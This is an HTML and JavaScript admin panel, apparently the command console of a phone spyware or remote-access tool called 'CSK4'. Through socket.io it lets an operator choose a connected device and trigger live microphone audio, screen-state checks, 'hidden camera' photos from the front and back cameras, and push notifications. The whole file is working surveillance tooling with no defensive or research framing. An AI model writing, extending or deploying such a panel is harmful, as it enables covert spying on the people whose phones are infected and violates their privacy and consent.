<!DOCTYPE html>
<html>
<head>
    <title>CSK4 Admin Panel</title>
    <style>
        body { background: #0a0e27; color: #fff; font-family: Arial; padding: 20px; }
        .box { background: #141a33; padding: 20px; border-radius: 10px; margin-bottom: 20px; border: 1px solid #2a3255;}
        button { padding: 10px 15px; margin: 5px; cursor: pointer; background: #4f8cff; color: #fff; border: none; border-radius: 5px; font-weight: bold;}
        button:hover { background: #3a7aff; }
        select, input { padding: 10px; margin: 5px; border-radius: 5px; border: 1px solid #2a3255; background: #0a0e27; color: white;}
        .danger { background: #dc2626; }
    </style>
</head>
<body>
    <h1>🛡️ CSK4 Advanced Admin</h1>
    
    <div class="box">
        <h3>Select Device</h3>
        <select id="deviceSelect"><option value="">-- Select Device --</option></select>
    </div>

    <div class="box">
        <h3>1 & 2: Audio & Screen</h3>
        <button onclick="sendCmd('start_live_audio')">🎤 Start Audio</button>
        <button onclick="sendCmd('stop_live_audio')" class="danger">⏹ Stop Audio</button>
        <button onclick="sendCmd('check_screen')">📱 Check Screen</button>
        <p>Screen State: <b id="screenState">Unknown</b></p>
    </div>

    <div class="box">
        <h3>3: Hidden Camera</h3>
        <button onclick="sendCmd('take_photo_front')">🤳 Front Camera</button>
        <button onclick="sendCmd('take_photo_back')">📷 Back Camera</button>
    </div>

    <div class="box">
        <h3>4: Push Notification</h3>
        <input id="pushTitle" placeholder="Title">
        <input id="pushMsg" placeholder="Message">
        <button onclick="sendPush()">🚀 Send Notification</button>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        socket.emit('register_admin');

        socket.on('device_list', (deviceId) => {
            const select = document.getElementById('deviceSelect');
            if (!Array.from(select.options).some(o => o.value === deviceId)) {
                select.innerHTML += `<option value="${deviceId}">${deviceId}</option>`;
            }
        });

        socket.on('screen_state_update', (data) => {
            document.getElementById('screenState').innerText = data.state ? "ON 🟢" : "OFF 🔴";
        });

        function sendCmd(type) {
            const deviceId = document.getElementById('deviceSelect').value;
            if (!deviceId) return alert('Pehle device select karo!');
            socket.emit('command', { deviceId, type });
        }

        function sendPush() {
            const deviceId = document.getElementById('deviceSelect').value;
            const title = document.getElementById('pushTitle').value;
            const message = document.getElementById('pushMsg').value;
            if (!deviceId || !message) return alert('Fields fill karo!');
            socket.emit('command', { deviceId, type: 'push_notification', data: { title, message } });
        }
    </script>
</body>
</html>
